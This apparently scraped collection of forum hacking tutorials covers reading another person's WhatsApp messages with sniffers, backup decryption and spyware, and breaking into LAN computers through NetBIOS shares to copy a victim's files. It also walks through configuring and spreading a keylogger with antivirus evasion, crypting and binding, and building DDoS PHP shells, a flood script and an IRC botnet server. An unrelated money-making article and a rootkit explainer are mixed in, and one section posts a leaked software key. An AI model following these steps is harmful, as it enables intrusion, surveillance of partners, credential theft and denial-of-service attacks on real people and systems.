0	How to Hack someones Whatsapp and read their chat messages.	""" After lot of Researching I came upon with 3 Whatsapp Hacks which Really Works, and in this article i will also clear some misconception on WhatsApp Hacking. 1. WhatsApp Sniffer WhatsAppSniffer is a tool for root terminals to read WhatsApp conversations of a WIFI network (Open, WEP, WPA/WPA2). It captures the conversations, pictures / videos and coordinates that aresent or received by an Android phone, iPhone or Nokia on the same WIFI network. It has not been tested with W indows Phone terminals. It canÃ¢â¬â¢t read the messages written or received by the BlackBerryÃ¢â¬â¢s, as they use their own servers and not WhatsAppÃ¢â¬â¢s. This application is designed to demonstrate that the security of WhatsAppÃ¢â¬â¢s communications is null. WhatsAppSniffer just use the TCPDump program which reads all the WIFI network packets and filters those which has origin or destination WhatsAppÃ¢â¬â¢s servers. All messages are in plain text, so it does not decrypt anything, complying fully with the legal terms of WhatsApp (3.C: Ã¢â¬ÅWhile we do not disallow the use of sniffers Such as Ethereal, tcpdump or HttpWatch in general, Any we do going efforts to disallow reverse-engineer our system, our protocols, or explore outside the boundaries of the ordinary requests made by clients WhatsApp Ã¢â¬Â¦. Ã¢â¬Å) For WPA/WPA2 encrypted networks, if uses the tool ARPSpoof (optional).  Requirements A Rooted Android Device. Your Victim Should Use Same Wi-Fi Through Which you are connected. WhatsAppSniffer Donate ★ root v1.03. This Trick is much similar to Hack your FriendÃ¢â¬â¢s Facebook Account 2. Decrypting Conversations have your victim locked his whatsapp? or you want all his conversation on your PC. Generally for security reasons WhatsApp encrypt Conversation while taking backup in SD Card or Phone Memory.But i have found a tool on XDA that claims to decrypt all the whatsapp conversation down to your PC. If you have some access over his device you can also send files from Bluetooth to your device and later read all the conversations. This tool is called WhatsApp Xtract and for this all credits goes to ztedd Some general advice on how to backup Whatsapp and get the database file: Android - In Whatsapp go to settings Ã¢â¬â more Ã¢â¬â Backup Chats - Copy the folder Ã¢â¬ÅWhatsappÃ¢â¬Â on the SD card to your backup location (e.g., PC) - (ideally also) use the app Titanium Backup to backup the full whatsapp application together with its data, copy the backup from the folder Ã¢â¬ÅTitaniumBackupÃ¢â¬Â on the SD card to your backup location (e.g., PC) - Use this tool Whatsapp Backup Extractor (download in this thread) to show the chats in a friendly readable format. The necessary files Ã¢â¬Åwa.dbÃ¢â¬Â and Ã¢â¬Åmsgstore.dbÃ¢â¬Â you will find inside the Titanium Backup archive Ã¢â¬Åcom.whatsapp-[Date]-[some digits].tar.gzÃ¢â¬Â, alternatively (without Titanium Backup) you can use the msgstore.db.crypt file from the folder Whatsapp/Databases on the SD card. iPhone - use Itunes to create an unencrypted Backup - use an Iphone Backup Tool to get the file net.whatsapp.WhatsApp/Documents/ChatStorage.sqlite, e.g. I-Twin or Iphone Backup Extractor. Make sure to create an unencrypted backup with Itunes, as these tools canÃ¢â¬â¢t handle encrypted backups. Another possibility are forensic tools like UFED Physical Analyzer.) Blackberry - sync your blackberry with desktop manager and then copy the messagestore.db file from SD - however, it seems that this file is encrypted? Currently we donÃ¢â¬â¢t know how to get the unencrypted messagestore.db file - Blackberry not supported yet! Nokia  - not known yet - Nokia not supported yet! For Further Detail about this Method you can move to this Forum of XDA. 3. Using Spywares Using 3rd Party Spywares can be very useful for spying not only WhatsApp Conversation but also many things like, you can able to Track GPS Location, you can capture the lock screen passwords and they can be also used for monitoring Websites. there are many spywares in the market but i recommend is BOSSPY. Because itÃ¢â¬â¢s free :) Some Misconceptions about WhatsApp hacking after writing Ã¢â¬Â4 WhatsApp Tricks and Hacks [Android]Ã¢â¬Â I have received a number of E-Mail Most of them were asking for help for hacking their partnerÃ¢â¬â¢s WhatsApp and I have replied them all. but lots of people were having misconceptions about whatsapp hacking so let me discuss over here. Hacking WhatsApp is Much Harder than Hacking Facebook and Twitter as Facebook and Twitter can be Hacked using Social Engeenering Techniques like Phising and many others when we compare to hack someones WhatsApp Account and Gain Full Access over his Account Ã¢â¬â It is nearly Impossible. There is no tool that can hack whatsapp and give you a full access over someoneÃ¢â¬â¢s whatsapp account. Yes, there are LotÃ¢â¬â¢s of Youtube VideoÃ¢â¬â¢s ,Websites Filled with Ã¢â¬ÅWhatsApp Hack ToolÃ¢â¬Â which claim that they can but the reality is they canÃ¢â¬â¢t.     * This article is for educational purposes only. we are not responsible for actions of any individual """

0	Hacking Into a Computer [With Pictures]	"""   NetBIOS Hacking -What is it?- NetBIOS Hacking is the art of hacking into someone elseÃ¢â¬â¢s computer  through your computer. NetBIOS stands for Ã¢â¬ÅNetwork Basic Input Output  System.Ã¢â¬Â It is a way for a LAN or WAN to share folders, files, drives,  and printers. -How can this be of use to me?- Most people donÃ¢â¬â¢t even know, but when theyÃ¢â¬â¢re on a LAN or WAN they could  possibly have their entire hard drive shared and not even know. So if  we can find a way into the network, their computer is at our disposal. -What do I need?- Windows OS Cain and Abel ( Hidden Content:  You must reply to see links ) ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++ -[Step 1, Finding the target.]- ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++ So first off we need to find a computer or the computer to hack into. So  if your plugged in to the LAN, or connected to the WAN, you can begin.  Open up Cain and Abel. This program has a built in sniffer feature. A  sniffer looks for all IP addresses in the local subnet. Once you have  opened up the program click on the sniffer tab, click the Start/Stop  sniffer, and then click the blue cross Another window will pop up, make sure Ã¢â¬ÅAll host in my subnetÃ¢â¬Â is selected, and then click ok. It should begin to scan. Then IPÃ¢â¬â¢s, computer names, and mac addresses will show up.  Now remember the IP address of the computer you are going to be breaking into.  If you canÃ¢â¬â¢t tell whether the IP address is a computer, router, modem, etc, thatÃ¢â¬â¢s ok.  During the next step we will begin our trial and error. ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++ -[Part 2, Trial and Error]- ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++ Now, we donÃ¢â¬â¢t know if we have our designated target, or if we have a  computer or printer, or whatever else is on the LAN or WAN.  If you did get the IP of the target though, I still recommend reading through this section, for it could be helpful later on.  Click on the start menu and go to run, type in cmd, and click ok.  This should bring up the command prompt.  From here we will do most of the hacking.  Now I will be referring to certain commands that need to be inputted into the command prompt.  I will put these commands in quotes, but do not put the quotes in the code when you type it into the prompt.  I am only doing this to avoid confusion.  LetÃ¢â¬â¢s get back to the hacking.  Type in Ã¢â¬Åping (IP address of the target).Ã¢â¬Â For example in this tutorial, Ã¢â¬Åping 192.168.1.103.Ã¢â¬Â  This will tell us if the target is online.  If it worked, it will look something like this (note, I have colored out private information): IF it didnÃ¢â¬â¢t work, meaning that the target is not online, it will look something like this: If the target is not online, either switch to a different target, or try  another time. If the target is online, then we can proceed. ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++ -[Part 3, Gathering the Information.]- ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++ Now, input this command Ã¢â¬Ånbtstat Ã¢â¬âa (IP address of target).Ã¢â¬Â An example would be Ã¢â¬Ånbtstat Ã¢â¬âa 192.168.1.103.Ã¢â¬Â  This will show us if there is file sharing enabled, and if there is, it  will give us the: currently logged on user, workgroup, and computer  name. Ok, youÃ¢â¬â¢re probably wondering, Ã¢â¬ÅWhat does all this mean to me?Ã¢â¬Â Well,  this is actually very important, without this, the hack would not work.  So, let me break it down from the top to bottom. I will just give the  first line of information, and then explain the paragraph that follows  it. The information right below the original command says: Ã¢â¬ÅLocal Area  Connection,Ã¢â¬Â this information tells us about our connection through the  LAN, and in my case, I am not connected through LAN, so the host is not  found, and there is no IP. The information right below the Ã¢â¬ÅLocal Area Connection,Ã¢â¬Â is Ã¢â¬ÅWireless  Network Connection 2:Ã¢â¬Â It gives us information about the connection to  the target through WAN. In my case I am connected through the WAN, so it  was able to find the Node IpAddress. The Node IpAddress is the local  area IP of the computer you are going to break into. The NetBIOS Remote Machine Name Table, give us the workgroup of our  computer, tells us if it is shared, and gives us the computer name.  Sometimes it will even give us the currently logged on user, but in my  case, it didnÃ¢â¬â¢t. BATGIRL is the name of the computer I am trying to  connect to. If you look to the right you should see a <20>. This  means that file sharing is enabled on BATGIRL. If there was not a  <20> to the right of the Name, then you have reached a dead end  and need to go find another IP, or quit for now. Below BATGIRL is the  computers workgroup, SUPERHEROES. If you are confused about which one is  the workgroup, and the computer, look under the Type category to the  right of the < > for every Name. If it says UNIQUE, it is one  system, such as a printer or computer. If it is GROUP, then it is the  workgroup ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++ -[Step 4, Breaking In]- ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++ Finally itÃ¢â¬â¢s time. By now we know: that our target is online, our target has file sharing, and our targetÃ¢â¬â¢s computer name.  So itÃ¢â¬â¢s time to break in.  We will now locate the shared drives, folders, files, or printers. Type in Ã¢â¬Ånet view \\\\(IP Address of Target)Ã¢â¬Â An example for this tutorial would be: Ã¢â¬Ånet view \\\\192.168.1.103Ã¢â¬Â We have our just found our share name. In this case, under the share  name is Ã¢â¬ÅC,Ã¢â¬Â meaning that the only shared thing on the computer is C.  Then to the right, under Type, it says Ã¢â¬ÅDisk.Ã¢â¬Â This means that it is the  actual C DISK of the computer. The C DISK can sometimes be an entire  personÃ¢â¬â¢s hard drive. Alls that is left to do is Ã¢â¬ÅmapÃ¢â¬Â the shared drive onto our computer.  This means that we will make a drive on our computer, and all the  contents of the targets computer can be accessed through our created  network drive. Type in Ã¢â¬Ånet use K: \\\\(IP Address of Target)\\(Shared  Drive). For my example in this tutorial, Ã¢â¬Ånet use K: \\\\192.168.1.103\\C.Ã¢â¬Â  Ok, letÃ¢â¬â¢s say that you plan on doing this again to a different person,  do u see the Ã¢â¬ÅK after Ã¢â¬Ånet use?Ã¢â¬Â This is the letter of the drive that  you are making on your computer. It can be any letter you wish, as long  as the same letter is not in use by your computer. So it could be Ã¢â¬Ånet  use G...,Ã¢â¬Â for a different target. As you can see, for my hack I have already used Ã¢â¬ÅK,Ã¢â¬Â so I used Ã¢â¬ÅGÃ¢â¬Â instead.  You may also do the same for multiple hacks.  If it worked, it will say Ã¢â¬ÅThe command completed successfully.Ã¢â¬Â  If not, you will have to go retrace you steps.  Now open up Ã¢â¬Åmy computerÃ¢â¬Â under the start menu, and your newly created network drive should be there. Now, if you disconnect from the WAN or LAN, you will not be able to access this drive, hence the name Network Drive.  The drive will not be deleted after you disconnect though, but you wonÃ¢â¬â¢t  be able to access it until you reconnect to the network.  So if you are doing this for the content of the drive, I recommend  dragging the files and folders inside of the drive onto your computer,  because you never know if the target changes the sharing setting.  If you are just doing this to hack something, then go explore it and have some well deserved fun! Congratulations! YouÃ¢â¬â¢re DONE! -Commands used in this tutorial: PING NBTSTAT -a (IP Address of Target) NET VIEW \\\\(IP Address of Target) NET USE K: \\\\(IP Address of Target)\\(SHARENAME)   """

0	Making Money on Website without Ads[9 Ways]	""" To most people, making money online is mostly about advertising on your blog or website. Advertisements can be of various form, including direct ads, affiliate ads, sponsored ads, and so on. While advertising remains one of the most popular and lucrative forms of online earning, it is not the only one. If you donÃ¢â¬â¢t want to clutter up your website with all those ads, and prefer to keep things minimalistic, then you can consider other ways of making money with your website. 1. Sponsored Reviews Paid reviews are a very common method of making money. Authoritative websites, or websites focused on a particular niche get paid to review certain website, app or web service. If you have a website with a decent traffic, you can contact a review network too and get paid for writing reviews on your website. Some of these networks include PayPerPost, ReviewMe, and BlogVertise etc. 2. Affiliate marketing Affiliate marketing is a form of advertisement, but not if you do it properly. Instead of just stamping an affiliate ad in your websiteÃ¢â¬â¢s sidebar, itÃ¢â¬â¢s far more important to actually create content about the product youÃ¢â¬â¢re advocating. People write reviews, comparisons, rounds ups, and so on about the affiliate products they want to sell on their blog. 3. Consultancy and Special services Offering your expert services in the form of consultation to clients who pay you is another form of making money online. 4. Software and Tools If youÃ¢â¬â¢re a developer, you can showcase the software and tools youÃ¢â¬â¢ve created on your website to make money. Some people offer free tools on their sites. You can offer trials, with option for users to buy the full versions of your software. These tools can be anything from Blogger widgets to WordPress plugins. 5. Themes and templates ThereÃ¢â¬â¢s another source of income you might have overlooked. If youÃ¢â¬â¢re good at tweaking templates and themes, you can create your own and sell them. Bloggers are always looking for new themes or templates for their blogs, which is why some people, such as Brian Gardner from StudioPress, have made a fortune developing and selling templates. 6. Paid surveys and polls There are services that will pay you money to run a small survey or poll on your website. The most popular one is called Vizu Answers. Basically you need to sign up with them, and select the kind of polls that you want to run your site. Most of these services operate under a CPM model. 7. eBook marketing If you have sound knowledge of a particular subject, why not use it? You can build an eBook on it, and then sell it for a profit! Check out our post on building an  eBook delivery system , complete with an auto-responder. Almost every pro-blogger has used this technique to make some money. 8. Donations I hope things donÃ¢â¬â¢t come to this, but if youÃ¢â¬â¢re really doing some community work, or developing an open-source software, you can ask people for donations to fund your project. I wouldnt put it down as a profitable endeavor though. There are certain moral obligations associated with taking donations from the public Ã¢â¬â learn and understand them. 9. Selling websites and domains Another very profitable business model is making and selling websites. Good domain names themselves go for 6+ figures. And developing websites can further add value.

0	Keyloggers - the complete tutorial	"""   KEYLOGGERS - THE COMPLETE TUTORIAL There are many ways you can hack a computer - RATs, Keyloggers, bots and Password Stealers. In this tutorial I will teach you how to set up your own Keylogger and also protect yourself against them. What is a Keylogger? A keylogger is a program that records a persons keystrokes (everything  they type) and send the logs back to the the hacker by either email of  FTP. Good keyloggers also detail what program the keystrokes were typed into. Settings For this tutorial I will be using images from Unknown Logger V 1.3.3 as I  believe that it is very thorough logger but there are many free  keyloggers  which I will link in another section. Note: We will be going from the top left going down  There are two ways that you can receive your keylogs email or FTP. Email  With email I recommend you create a two new email addresses (one for  sending and one for receiving) and not to use your personal email. Gmail is usually what people use as it can hold lots of logs and is secure if you have the settings right. Email Address:  you put your email address into that, obviously. Password:  you put in the password  of your keylogger email. I recommend your new email address has a  different email than your personal email address  because if you have it as your recovery email they can see the address and login with the same pass. SMTP Server:  is where you get your  email. So for Gmail it would be smtp.gmail.com and for Hotmail it would  be smtp.live.com . You can search for these if you are not sure. Logs Sent To:  you put where the  logs will be sent to. You could set this as the same email address you  used in the first field but this would be less secure and you would be  much safer having them sent to a different email with a different pass. Port: this is the SMTP port. For Gmail this port is 587. You should look up what port your email provider uses. FTP  For FTP you need an FTP server. There are many sites that offer FTP like  Hidden Content:  You must reply to see links  or just go here:  Hidden Content:  You must reply to see links Username:  Your FTP Username (you will be given this) Password:  You will be given this or asked to make one depending on host URL:  This is the FTP address where it will save logs. You will be given the address by your host. I would advise you to test these. Lots of keyloggers offer you a button to test. Icon  Icons add to your servers credibility. Location:  you put the address of the icon you want to use here. If you are going to be crypting or binding theres no need. File Pumper  File Pumpers increase the size of the server file. This is used to make it more believable. Add:  here you put how many KB/MB/GB you want to increase your file by. In:  Here you select what format the  number you had in the Add box was in (KB, MB or GB). KB stand for  Kilobytes and would be used for very small amounts. MB stands for  Megabyte and would be best if you are say, binding it with a song. Songs  are usually 4-6MB. GB stands for Gigabytes and would be used for huge  files like Adobe C26 Suite would be 200GB or more. Send Logs Time Interval  This is important. This is how often you want the logger to send  keylogs. Dont set it too small because you would just get lots of very  short logs, and dont set it too high to say 2 hours as your victim  mightnt use the PC for that long and it would never get sent. Best  setting would be 30-60 mins. Server:  just the name that it will put in the file it outputs. The checkbox is self-explanatory. Antis  These disable or make your server undetectable to antiviruses and  sandboxes and other forms of security. It varies from program to program  what way the antis work. I would advise enabling these as they allow  your keylogger to be on the computer for longer. Spreaders  These are methods of infecting more computers using your victims  computer. They operate by infecting files sent on P2P programs  (Limewire, Shareaza, Emule, Bearshare etc.), infecting USB drives (USB),  sending files over LAN (LAN), infecting specific filetypes (Rar, Zip)  sending files of chat and messaging applications (Outlook, Omegle, MSN,  Yahoo, Skype, ICQ) and other methods. Spreaders are always handy for getting more victims with little effort  as it uses your victims computer power rather than your time and energy. Stealers  Stealers take logins and keys for various programs. They make the  process of taking usernames and passwords a lot quicker as you wont  need to search through endless logs. Fake Message  Possibly the silliest feature (yet for some reason every RAT and  Keylogger has one) and one I would advise you not to use it. Basically  what it does is bring up a fake error message on your victims PC. If you  do use this it will be quite obvious to the user that their PC is  infected and they will remove your keylogger. Webcam Logger  This will take pictures/video with the webcam on the victims PC if they  have one. Set the interval the same as the logs interval before if you  want to use it. Screen Logger  This will take screenshots of the victims screen every period of time.  Set it the same as logs too if you want to use it. If it is set too low  you will have too much data. Clipboard Logger  This saves text that the victim copies to the clipboard. So basically every thing copy is saved. Download and Execute  It is very important that you have this on every keylogger or RAT that  you use. It allows you to install another keylogger or RAT on your  victims PC. This mean that you can change to a different RAT or  keylogger later or give some victims to a friend or what not. Add link(s) to places where you can put a file to download and execute if you ever need it eg:  Hidden Content:  You must reply to see links  OR you can make a shortened link at bit.ly and direct it to your server when you need it. Webpage Loader/Ad Visitor  This opens webpages and ads. Its obvious and would alert your victim  that they are infected. You would use affiliate links and other methods  to get money from this feature. Run at Startup  It will start the keylogger on start up. Tick it no matter what. Melt  This deletes the server file once it has infected the PC. Mutex  Click + several times. This helps make it more undetectable. Text to Speech  This will play a message using Windows text-to-speech feature when  server is installed. Similar to Fake Message it alerts the victim that  they are infected and has no benefit so I advise you not to use it Assembly Changer  This changes the Assembly Information on your file. If you go to the  properties of any file on your computer and go to Properties>Assembly  you will see information about the file. Thats what the Assembly  Changer changes.  Cookie Deleters  These are brilliant! If your victim has saved their passwords for  different sites they wont need type them in and your keylogger wont get  them so what this does is delete their cookies so that they have to  login again. Website Blocker  This blocks websites. The options given in this picture block Virus scanning websites but you can add other sites too. Disablers  These disable different windows features on the victims computer so that  it is harder for them to remove your virus. If your victim is savvy  they will notice this straight away and remove the keylogger very  quickly. I wouldnt use these except maybe Disable system restore,  disable registry tools and disable registry as these are not used as  often and wouldnt be noticed. What Next? Worming  Worms make your victim spread your virus to his contacts and whatever  the plug their USB stick into etc. Our example above had worm options  (spreaders) but not every keylogger, RAT etc have worm/spreading  options. Crypting  Crypting is important if you want to get lots of victims and keep them  for a long time. It makes your server undetectable to Anti-viruses. FUD stands for Fully-undetectable and UD stands for Un-Detectable. FUD crypters are the best especially private ones. Binding  Binding is when you bind your server with another file or program. It is  very useful for spreading. You would bind your server with  chessgame.exe (for example) and say \""Hey check this cool game out!\"" and  when they open it the game will open but so will the RAT. The victim  would be none the wiser on whether they were infected or not whereas  they would be suspicious if nothing opened. Spreading  These are methods of getting victims for your keylogger. You should get a few and use them as effectively as possible. How do I Protect Myself Against Keyloggers? Having an Anti Virus would be a start! Obviously be careful with what you download too. There is a tool that I think works very well against keyloggers. Its is called KeyScrambler. Whenever you type something it randomizes it  so that if a keylogger has infected your PC they would just get logs of  jumbled numbers, letters and symbols. You can get KeyScrambler here:  Hidden Content:  You must reply to see links The Official Site:  Hidden Content:  You must reply to see links And the user and key:  Code: [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */  MLWWLTFJ7    If that dosent work you can just use the free version or try to find another key :71: If you dont want to use keyscrambler there is also  Hidden Content:  You must reply to see links How To Reverse Engineer a Keylogger This is my favorite part. If you know your PC is infected or a file is  infected you can get the email login or FTP login from the server.  People also go \""whaling\"" and download obvious viruses from youtube to  steal lots of keylogs and slaves from skids. There are two ways to do this and I will explain both below. Wireshark  1. Download and install WireShark if you do not already have it:  Hidden Content:  You must reply to see links  . While it is installing make sure Winpcap gets installed with it. 2. If you have an infected file and are not yet infected then open it in  SandBoxie or VirtualBox or VMWare and follow these steps within the  virtual machines. If you are already infected you can skip to the next  step. 3. Once it is installed open it up and click \""Capture\"" on the top menu  and select the interface - if you are following in a virtual machine  select that otherwise select windows or your network card. 4. Leave it on like that for about half an hour. This is to make sure  the keylogger actually does connect back while you are capturing  packets. (refer back to \""Time Intervals\"") 5. When it is done you need to filter through the results for the FTP or  email login. Type \""FTP\"" in the filter box and search. If a login comes  up for that then they have used an FTP server to take your keylogs. If  not try \""SMTP\"" to search for email login. If this dosent work then either -  the keylogger hasnt connected back You did something wrong You are not infected   6. Now that you have their login details you can take all their keylogs  and delete their keylogs of you. Then just change the password so they  no longer have access :38: BinText  1. Download BinText here:  Hidden Content:  You must reply to see links 2. Open BinText and drag the infected file into the BinText window. 3. Now search through it for \""hotmail\"" \""gmail\"" \""yahoo\"" \""ftp\"" etc. 4. Self-explanatory amirite? """
0	[MEGA TUT][IRC SERVER SETUP]Botnets and (D)Dos Attacks[HTTP/IRC BOT SETUP]	"""   THIS IS A WORK IN PROGRESS Now, if youre like me and you spend a lot of time in the Botnets  section, you probably have notice the excess of noob threads. Not that  asking questions is bad,everyone starts out somewhere, but I felt like  making one thread that can successfully eliminate most/all of these  questions, and leave the section for more intelligent topics.  What is DOS, what is DDOS, an what is the difference? DOS, denial of service, is an attack which causes a host to deny service. This is an attack from  one  machine. Generally these are not very successful or useful unless an exploit is used. DDOS, distributed denial of service, again, is an attack which cause a  host to deny service. However, as the name would suggest, this attack is  distributed, meaning  more than one  machine is used to attack. Of the two methods, DDOS tends to be much more effective, unless a VPS is used (discussed later) Now that you know what youre talking about, youre probably wondering  how can I execute one of these attacks? There are several ways you can execute a DDOS attack. The most common are: 1. Php shells 2. VPS (virtual private server) with a dos script. 3. Botnet 4. *NIX Botnet  What is a PHP shell? A php shell is a php script hosted on a web server, used for dos. When  several php shells are used at once, you are able to make a DDOS attack. Now you may ask, how do I make a shell? A shell is created by hosting a shell on a vps. First, you would go to 2host.com and buy a vps. Choose CentOS 5 as your operating system. Once you have received your vps, you would execute these commands. [INDENT]Quote:yum install httpd yum install php[/INDENT] What you have just done is installed a web server Onto your vps. Then type: [INDENT]Quote:cd /var/www/html[/INDENT] Now upload your php shell. [INDENT]Quote:wget  Hidden Content:  You must reply to see links [/INDENT] Now, start your http server, as your shell is ready to use. Type: [INDENT]Quote:service httpd start[/INDENT] Next go into your web browser and navigate to [your vps ip]/index.php Now, if youve been paying attention, youre probably thinking \""wait, this is only one host, I thought you said this was DDOS?\"" Well, do this several times on multiple different vpss, and hook them  up using prodigies web booster source, and it is DDOS. Sorry, I will not  be providing a tutorial for this. (if I forget to provide a link,  remind me to post one)  The setup for thi will be very similar to that of the shell. After buying your vps, you will execute this command: [INDENT]Quote:yum install perl[/INDENT] Next: [INDENT]Quote:wget  Hidden Content:  You must reply to see links [/INDENT] (script courtesy ItsFluffy) The script can be executed by using [INDENT]Quote:perl super.pl [IP] [PORT] 65500 [TIME IN SECONDS][/INDENT]  Again this is only a dos attack, however, you can set up multiple of  these and use my tutorial to use multiple of these and create a DDOS  attack.    First, to clear up some confusion, Im going to clea up some terminology. Bot: software used to infect/control a large amount of computers, or a computer infected with such software. Botnet: a collection of bots. Made up of two or more bots. Using the word incorrectly just makes it harder for other users to help you.  When using an irc bot, your irc server is what you use to control your bots. Ill be showing you how to set one of these up. 1. Upload the unreal files to your vps 2. Upload config file  Hidden Content:  You must reply to see links 3. Edit the config file. Replace \""YOUR PASSWORD\"" with your desired password and \""YOUR IP\"" with your vpss ip. 4. Type these commands in yum install gcc yum install zlib yum install OpenSSL yum install OpenSSL-devel ulimit -n 16384 4b. Type vi /etc/security/limits.conf Scroll down to the bottom of the file and press I Add this to the end of the file root hard nofile 16384 root soft nofile 16384 5. Cd into the folder that contains your unrealircd files 6. Type ./Config If it says permission denied, type chmod +x Config 7. Press enter until you see a setting about SSL. Input yes, and leave the location blank. 8. Afterwards, keep pressing enter until a setting involving zip links is reached. Choose yes. Again, leave the location blank. 8b. For the last setting, make the number of sockets 16384 9. After all of this is done, type make 10. After it finishes compiling, type ./unreal start 11. Open up mIRC. 12. Click select server. Add, put whatever in the description, and for  IRC server, put your vpss ip. Leave group and password blank.  13. Join this newly created server.  14. To make yourself op, type: /oper oper [the password in your config file] Links Setting Up Kaiten (a Linux Bot) FAQS Q: How can I become a respected member in this section? A: The best thing you can do to be a  respected member in this section is to be self sufficient. Realize that  you dont have to make a thread for everything, and that there is a  search function on this forum. When youre trying to set something up,  look for tutorials elsewhere on the internet, if youre having trouble  with it, its likely that someone else has too, and asked a question  about it. And if you cant find any tutorials on things, try some trial  and error. If the irc error is \""No ircd.log file found\"", hell, why not  create that file? Q: My HTTP bot is set up seemingly corectly, but it still doesnt work, what do I do? A: Make sure all of the files permissions  are set to 777. Also, this may seem stupid, but make sure that the  MySQL user has been added to the database. Q: My bots arent responding to commands on my IRC server, whats wrong? A: Most IRC bots use a form of  authentication via your hostname. For the bot respond to commands, you  must have a certain hostname. This is set when you built your bot. You  sould set your host by doing /sethost [the host that you set during  build]. In addition, make sure you are using the correct comand prefix. Q: When I try to do \""yum install httpd\"" it says that the command  doesnt exist. A: You are probably using the wrong OS,  most likely Ubuntu or Debian. Be sure to install CentOS. If you have a  SolusVM control panel, you are able to switch your operating system   """

0	All about Malware - ROOTKITS	"""   ROOTKITS Definition: Spoiler A rootkit is a stealthy type of malware which is used to hide processes, programs and registry keys from the user. A rootkit installation could be automatic or a hacker could install it on victims computer. Once they’ve obtained root/Administrator access, they start to hide something. A rootkit is not an exploit! A rootkit could get full control over a system and can modify everything, normally the system. How does a rootkit work? Spoiler To explain how a rootkit works, I need to explain first how an application normally works on your computer. Let’s take the timer application as an example. The timer shows you the current time. But to get the timer know what’s the current time, the timer needs to know it from the system. But the timer is not allowed to get access to the system clock. But the timer is allowed to ask windows or better: the API (Application Programming Interface). Well our clock wants to know the time. The clock uses the function in the API to get time. The API can now access to the system clock to read out the current time. The system gives us the response over the API and our clock application can tell us the current time: Every application works like that. There’s no exception. Another example: After clicking a folder we could see what files are into. It works the same way as above. Our explorer wants to know what files are on C:\\ so it has to ask the API. The API tells the system to list all files on C:\\. [/align] The system gives us the response over the API and our explorer can display us all files on C:\\ [/align] Now let’s see what happens when our system is infected with a rootkit Spoiler We take the same example as before, where the explorer displays us the files on C:\\. (The red bug in the image is the rootkit) The rootkit makes just one thing at startup. It modifies the Enum-File API .  The rootkit sets a  “Jump-Point” at the Enum-Files-API. (The \""Jump-Point\"" is the red area at the API) Now our explorer should display us the files on C:\\ so it asks the Enum-Files API. But we know that our Enum-Files API has a new “Jump-Point” and the API did not ask the real system function to read out the files on C:\\ instead it asks one of the rootkit DLL’s. The rootkit DLL asks now the real Enum-Files-Function. And the real Enum-Files API gets the list of all files on C:\\ We could now see there are all Files and also the File named “Virus.exe”.  This is the file the rootkit wants to hide from the User and also from the antivirus software. So it deletes the Virus.exe file from the list. (It does not delete the file itself it just deletes the entry in the list.) The filtered List without the Virus.exe file goes back to the real Enum-Files API and the real Enum-Files API sends the filtered list back to our explorer. The explorer displays all files, but NOT the Virus.exe file!  I hope you could understand now how a rootkit works in general.  That’s the same thing if you antivirus software scans your computer. If the computer is infected with a rootkit, the program could not detect the rootkit because he could not see it. The antivirus scans only a modified files by the rootkit. Types of rootkits Spoiler There are different Types of rootkits. Here is a list: Kernel-Based: Typically, kernel-based rootkits are codes that are able to mask themselves under the operating systems loadable modules and device drivers. Because these rootkits are incorporated inside important components, detecting them can be difficult. A kernel-based rootkit rewrites and modifies the kernels code to stay hidden and manipulate every facet of the operating system. Because it is within the kernel, it has pretty much unrestricted movement within the system. Some popular malicious kernel-based rootkit examples in Windows are TR/Rootkit.Gen, W32.Focelto.A and Haxdoor rootkits. Application-Based: Application-based rootkits are pretty common. They find their way into a computer system through the installation or updating of software, such as word-processing, graphics-editing, gaming and other commonly used computer programs. These rootkits come in the form of an application library file that will be associated with the application installed. It will modify the behavior of the application to escape detection and do what it was written to do. For example, when using a Windows-based system, you will often encounter this threat by way of a suspicious .DLL file. The rootkit will then replicate certain processes to evade detection while it captures information in the system. Application-based rootkits are easier to manage than some other types, since most system-protection software constantly updates definitions to include these types of malicious codes. Firmware-Based: A firmware-based rootkit is a code specifically designed to create a permanent instance of the Trojan or malware in a device through its firmware--a combination of hardware and software, such as computer chips. For example, a simple residential DSL router uses firmware. If its firmware is compromised by a rootkit, theres really no way to detect it and the damage it can cause can be enormous, especially since all of the data you send and receive online passes through the router. Basically, there are only two ways a rootkit can embed itself in the firmware of a specific hardware--through a firmware update or through purchase, where the seller purposely installs the rootkit before selling it. Virtual: Considered to be low-level threats, virtual or virtualized rootkits hijack and modify a system and boot it up to appear as a virtual machine. This will allow the rootkit to capture data from the hardware as a guest machine requests it. While these types of rootkits arent common, it is a vulnerability that Microsoft and Linux are aware of. Source:  Rootkit Types The first rootkits: Spoiler Here is a short List with some of the first rootkits for windows ever made: Year 2000 – he4hoook   This tool was developed by a Russian programmer. It works in Kernel mode and hides files. The author itself doesn’t say it’s a rootkit. Year 2002 – HackerDefender The HackerDefender is also a tool, but a more powerful one. You can use it over a configuration file to hide files, processes, Services and registry keys. It also works in Kernel mode. Year 2003 – Vanquish  The tool vanquish could also be used to hide files, directories, processes and registry keys. It could also record the passwords on a user’s computer. This rootkit is usermode based. How to detect rootkits? Spoiler There are different methods of detecting rootkits. But only a good antivirus software could do this, you as normal user are not able to find a rootkit if it’s well hidden. You could never detect a rootkit and be 100% sure it is one. There are some plausibility 